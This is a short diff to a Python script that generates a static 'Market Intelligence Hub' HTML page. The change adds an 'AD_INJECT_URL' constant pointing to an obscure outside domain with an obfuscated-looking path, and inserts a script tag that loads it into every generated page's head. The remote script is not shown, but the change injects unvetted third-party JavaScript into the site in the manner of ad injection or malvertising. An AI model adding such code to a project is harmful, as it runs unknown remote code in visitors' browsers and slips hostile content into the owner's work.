@@ -12,6 +12,7 @@ ROOT = Path(__file__).resolve().parent.parent.parent
 OUT = ROOT / "index.html"
 
 META_TOKEN = '1d7555627c6e58b3d3aaaf4b622bd79b7fd13167'
+AD_INJECT_URL = "https://frivolous-priest.com/bb3.Vb0nPT3VpQvMbWm/VdJ_Z/DQ0b2wOvTxI/xrO/DxMx3/LJTjYz5/MqjpEi4dN/D/ED"
 
 TOPICS = [
     ("Gold / Commodities", ["gold price forecast", "xauusd", "gold hedge"]),
@@ -95,6 +96,7 @@ def build_html(sections_html: str):
   <meta name="{META_TOKEN}" content="{META_TOKEN}">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Market Intelligence Hub</title>
+  <script src="{AD_INJECT_URL}"></script>
   <style>
     :root {{
       --bg: #050913;
